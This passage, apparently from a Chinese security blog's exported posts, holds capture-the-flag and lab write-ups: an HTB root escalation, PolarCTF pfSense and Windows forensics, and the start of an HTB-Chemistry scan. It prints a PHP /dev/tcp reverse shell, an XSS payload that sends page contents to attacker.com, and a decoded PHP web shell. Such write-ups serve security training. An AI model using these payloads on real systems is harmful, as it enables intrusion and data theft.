<code>david</code>，但是没用权限访问，没啥用</p><p><img src="https://img.dkdun.cn/v1/2025/12/97f3bf1648cbf020.png"></p><p>发现开放了 8080 端口</p><p><img src="https://img.dkdun.cn/v1/2025/12/ad79cd5bd4150414.png"></p><p>也没用，查看进程发现 <code>/opt</code> 下的 <code>website-monitor</code> 有 root 权限运行</p><p><img src="https://img.dkdun.cn/v1/2025/12/d8f23e385ec58629.png"></p><p>在 <code>/opt/website-monitor/config</code> 写入一个 shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;/dev/tcp/10.10.16.15/1234 0&gt;&amp;1&#x27;&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问 <code>http://127.0.0.1:8080/config/shell.php</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/e5acbc7d64eee663.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/f354fb3d5fb5a7c6.png"></p><p>拿到 root flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span><span class="hljs-number">586</span>ada<span class="hljs-number">87358</span>a<span class="hljs-number">165</span>d<span class="hljs-number">65</span>bfc<span class="hljs-number">94</span>a<span class="hljs-number">6</span>bc<span class="hljs-number">4459</span><br></code></pre></td></tr></table></figure><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/xss/#steal-contents-of-restricted-pages-or-files">https://exploit-notes.hdks.org/exploit/web/security-risk/xss/#steal-contents-of-restricted-pages-or-files</a></p><p>如果 JavaScript 代码可以通过 XSS 执行，我们就可以让受害者获取受限页面的内容并将其发送到我们的服务器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/secret&quot;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resp</span> =&gt;</span> resp.<span class="hljs-title function_">text</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://attacker.com/?text=<span class="hljs-subst">$&#123;btoa(text)&#125;</span>`</span>);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://attacker.com/?err=<span class="hljs-subst">$&#123;err&#125;</span>`</span>);<br>        &#125;);<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PolarCTF2025春季个人挑战赛-Misc</title>
    <link href="/2025/03/23/PolarCTF%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Misc/"/>
    <url>/2025/03/23/PolarCTF%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Misc/</url>
    
    <content type="html"><![CDATA[<p>两个简单的取证</p><span id="more"></span><h1 id="pfsense"><a href="#pfsense" class="headerlink" title="pfsense"></a>pfsense</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">1</span>、从流量数据包中找出攻击者利用漏洞开展攻击的会话，写出其中攻击者执行的命令中设置的<span class="hljs-built_in">flag</span>内容<br><span class="hljs-number">2</span>、攻击者通过漏洞利用获取设备控制权限，然后查找设备上的<span class="hljs-built_in">flag</span>文件，写出<span class="hljs-built_in">flag</span>的文件内容<br><span class="hljs-number">3</span>、找出并提交受控机设备中普通用户的IPsec预共享密钥<br></code></pre></td></tr></table></figure><h2 id="pfsense1"><a href="#pfsense1" class="headerlink" title="pfsense1"></a>pfsense1</h2><p>Wireshark 过滤 http 流量，找到了攻击会话</p><p><img src="https://img.dkdun.cn/v1/2025/12/30cc3def4e54dc7d.png"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">8</span>kYT<span class="hljs-number">1</span>mb<span class="hljs-number">3</span>BlbigiL<span class="hljs-number">3</span>Vzci<span class="hljs-number">9</span>sb<span class="hljs-number">2</span><span class="hljs-symbol">NhbC93</span>d<span class="hljs-number">3</span>c<span class="hljs-attr">vc3</span>lzdGVtX<span class="hljs-number">2</span>FkdmFuY<span class="hljs-number">2</span>VkX<span class="hljs-number">2</span><span class="hljs-symbol">NvbnRyb2</span>wucGhwIiwidyIpI<span class="hljs-name">G9</span>yIGRpZSgpOyR<span class="hljs-number">0</span>PSc<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocCBwcmludChwYX<span class="hljs-symbol">NzdGhydSggJF9</span>HRVRbImMiXSkpOz<span class="hljs-number">8</span>+Jztmd<span class="hljs-number">3</span>JpdGUoJGEsJHQp<span class="hljs-meta">O2</span>Zjb<span class="hljs-name">G9</span>zZSggJGEpOz<span class="hljs-number">8</span>+ZmxhZ<span class="hljs-number">3</span>tjOTMwYTIw<span class="hljs-symbol">NzI5</span>Y<span class="hljs-number">2</span>Q<span class="hljs-number">3</span>MTBjOWFjMmUxYm<span class="hljs-symbol">NkMzY4</span><span class="hljs-symbol">NTZlNX0</span>=<br></code></pre></td></tr></table></figure><p>base64 解码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/usr/local/www/system_advanced_control.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;&lt;?php print(passthru( $_GET[&quot;c&quot;]));?&gt;&#x27;</span>;<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$t</span>);<span class="hljs-title function_ invoke__">fclose</span>( <span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span>flag&#123;c930a20729cd710c9ac2e1bcd36856e5&#125;<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-keyword">c</span><span class="hljs-number">930</span>a<span class="hljs-number">20729</span>cd<span class="hljs-number">710</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ac<span class="hljs-number">2e1</span>bcd<span class="hljs-number">36856e5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="pfsense2"><a href="#pfsense2" class="headerlink" title="pfsense2"></a>pfsense2</h2><p>可以看到攻击者执行了 <code>ls -al</code> 命令</p><p><img src="https://img.dkdun.cn/v1/2025/12/5db2396b294b7fd7.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.139.2.139/system_advanced_control.php?c=ls -al<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ddc0a613b7a0b1a2.png"></p><p>按照会话显示上传木马</p><p><img src="https://img.dkdun.cn/v1/2025/12/5be58b647ab46f99.png"></p><p>执行会得到结果，用 find 命令查找 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;fla*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/42ec91e9abda60e2.png"></p><p>找到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>b030dacb6e82a5cca0b1e6d2c8779fa&#125;<br></code></pre></td></tr></table></figure><h2 id="pfsense3"><a href="#pfsense3" class="headerlink" title="pfsense3"></a>pfsense3</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>搜了一下 pfSense 的默认密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>pfsense<br></code></pre></td></tr></table></figure><p>不行，然后找到了重置密码方法，“运行<code>/etc/rc.initial.password</code>以重置为默认密码”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;y&quot;</span> | /etc/rc.initial.password<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/43d8a64a9c4093fa.png"></p><p>登录进去后找到 VPN 中的 IPSec</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>pfsense<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f1a1977a7ea2dd36.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;bde<span class="hljs-number">4</span>b<span class="hljs-number">5e2</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">43</span><span class="hljs-keyword">c</span><span class="hljs-number">177895</span>f<span class="hljs-number">6</span>f<span class="hljs-number">5</span>d<span class="hljs-number">85</span>beb<span class="hljs-number">97</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>查找 <code>config.xml</code> 配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*config.xml&quot;</span><br></code></pre></td></tr></table></figure><p>在 <code>/cf/conf/config.xml</code> 文件中找到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/8c8151bbb2eaa897.png"></p><h1 id="WinCS"><a href="#WinCS" class="headerlink" title="WinCS"></a>WinCS</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.受控机器木马的回连的<span class="hljs-built_in">ip</span>地址和端口是？（flag&#123;<span class="hljs-built_in">ip</span>:端口&#125;）<br><span class="hljs-number">2</span>.分析流量信息，攻击者尝试修改的jhon账户密码是什么？<br><span class="hljs-number">3</span>.分析流量当中，攻击者查看的文件中flag内容是什么？<br><span class="hljs-number">4</span>.攻击者在攻击过程当中修改过的注册表目录是什么？<br><span class="hljs-number">5</span>.受控机当中加密文件的内容是什么？<br><span class="hljs-number">6</span>.受控机木马的自启动文件路径是什么？<br></code></pre></td></tr></table></figure><h2 id="WinCS1"><a href="#WinCS1" class="headerlink" title="WinCS1"></a>WinCS1</h2><p>在火绒的信任项中有一个可以 <code>.exe</code> 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/a40ffff95fae77bd.png"></p><p>拿出来放入微步沙箱查杀，判定为木马</p><p><img src="https://img.dkdun.cn/v1/2025/12/b390012a0800795b.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/a42499ac6767e53e.png"></p><p>拿到回连 IP： 61.139.2.139:80</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">61.139.2.139:80</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS2"><a href="#WinCS2" class="headerlink" title="WinCS2"></a>WinCS2</h2><p>jhon 用户目录下有两张一样的图片</p><p><img src="https://img.dkdun.cn/v1/2025/12/e534d3fbfecad5da.png"></p><p>用 010 打开发现两张图片最后都有压缩包数据，并且能看见 <code>.cobaltstrike.beacon_keys</code> 字样</p><p><img src="https://img.dkdun.cn/v1/2025/12/77db36ec04799d87.png"></p><p>新建十六进制文件，把两张图片中的数据复制到新的文件保存得到压缩包，里面有 <code>.cobaltstrike.beacon_keys</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/46bd81ce2e2e4faf.png"></p><p>导入 NatA 分析得到 jhon 用户密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/80c55bba110881b5.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">flag&#123;<span class="hljs-selector-tag">P</span><span class="hljs-keyword">@ssW0rd</span><span class="hljs-keyword">@123</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS3"><a href="#WinCS3" class="headerlink" title="WinCS3"></a>WinCS3</h2><p>往下翻找到</p><p><img src="https://img.dkdun.cn/v1/2025/12/8833b2ee636d36bd.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">31975589</span>df49e6ce84853be7582549f4&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS4"><a href="#WinCS4" class="headerlink" title="WinCS4"></a>WinCS4</h2><p><img src="https://img.dkdun.cn/v1/2025/12/d0adeb57519e7386.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">HKEY_CURRENT_USER\Software\Classes\mscfile\<span class="hljs-built_in">shell</span>\<span class="hljs-built_in">open</span>\<span class="hljs-keyword">command</span><br></code></pre></td></tr></table></figure><p>md5 加密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">87</span>a76255029843238bf87091dd5a6c88&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS5"><a href="#WinCS5" class="headerlink" title="WinCS5"></a>WinCS5</h2><p>从之前的分析中还发现 jhon 用户目录下还有一个 <code>passkey.txt</code>，并且还有密码</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">PolarCTF@</span><span class="hljs-number">2025</span>Spring<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7c9eb10afeafad45.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;fc51bd0633d256f2dcbe282efa205c3a&#125;</span><br></code></pre></td></tr></table></figure><h2 id="WinCS6"><a href="#WinCS6" class="headerlink" title="WinCS6"></a>WinCS6</h2><p>在 <code>C:\Users\jhon\AppData\Local\Temp</code> 下发现批处理文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/9d16b9098fad2af6.png"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\jhon\AppData\Local\Temp\power.bat<br></code></pre></td></tr></table></figure><p>md5 加密</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;e991ef211ab8adc893dc874c4ae929b3&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Chemistry</title>
    <link href="/2025/03/22/HTB-Chemistry/"/>
    <url>/2025/03/22/HTB-Chemistry/</url>
    
    <content type="html"><![CDATA[<p>很简单的一个靶机，和 <a href="https://buutt3rf1y.github.io/2025/02/14/Shop/#SSH">THM-Publisher</a> 有一点点像</p><span id="more"></span><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">└─# nmap -sS -sV -Pn -A 10.10.11.38</span><br><span class="language-xml">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 19:06 CST</span><br><span class="language-xml">Nmap scan report for 10.10.11.38</span><br><span class="language-xml">Host is up (0.32s latency).</span><br><span class="language-xml">Not shown: 998 closed tcp ports (reset)</span><br><span class="language-xml">PORT     STATE SERVICE VERSION</span><br><span class="language-xml">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="language-xml">| ssh-hostkey:</span><br><span class="language-xml">|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)</span><br><span class="language-xml">|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)</span><br><span class="language-xml">|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)</span><br><span class="language-xml">5000/tcp open  upnp?</span><br><span class="language-xml">| fingerprint-strings:</span><br><span class="language-xml">|   GetRequest:</span><br><span class="language-xml">|     HTTP/1.1 200 OK</span><br><span class="language-xml">|     Server: Werkzeug/3.0.3 Python/3.9.5</span><br><span class="language-xml">|     Date: Sat, 22 Mar 2025 11:06:46 GMT</span><br><span class="language-xml">|     Content-Type: text/html; charset=utf-8</span><br><span class="language-xml">|     Content-Length: 719</span><br><span class="language-xml">|     Vary: Cookie</span><br><span class="language-xml">|     Connection: close</span><br><span class="language-xml">|     <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Chemistry - Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/styles.css&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span></span><br><span class="language-xml">|     class=&quot;title&quot;&gt;Chemistry CIF Analyzer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;buttons&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml">|     href=&quot;/register&quot; class=&quot;btn&quot;&gt;Register<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|   RTSPRequest:</span><br><span class="language-xml">|     <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span></span></span><br><span class="hljs-meta"><span class="language-xml">|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code: 400<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Message: Bad request version (&#x27;RTSP/1.0&#x27;).<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|_    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="language-xml">SF-Port5000-TCP:V=7.94SVN%I=7%D=3/22%Time=67DE99C3%P=x86_64-pc-linux-gnu%r</span><br><span class="language-xml">SF:(GetRequest,38A,&quot;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\</span><br><span class="language-xml">SF:x20Python/3\.9\.5\r\nDate:\x20Sat,\x2022\x20Mar\x202025\x2011:06:46\x20</span><br><span class="language-xml">SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\</span><br><span class="language-xml">SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<span class="hljs-meta">&lt;!DOCTYPE\x20h</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">SF</span>:tml&gt;</span>\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>\n\x20\x20\x20\x20&lt;meta\x20charset=\</span><br><span class="language-xml">SF:&quot;UTF-8\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;widt</span><br><span class="language-xml">SF:h=device-width,\x20initial-scale=1\.0\&quot;&gt;\n\x20\x20\x20\x20<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Chemis</span><br><span class="language-xml">SF:try\x20-\x20Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x</span><br><span class="language-xml">SF:20href=\&quot;/static/styles\.css\&quot;&gt;\n<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>\n\x20\x20\x20\x20\n\x2</span><br><span class="language-xml">SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20&lt;div\x20class=</span><br><span class="language-xml">SF:\&quot;container\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1\x20class=\&quot;title\&quot;&gt;</span><br><span class="language-xml">SF:Chemistry\x20CIF\x20Analyzer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>W</span><br><span 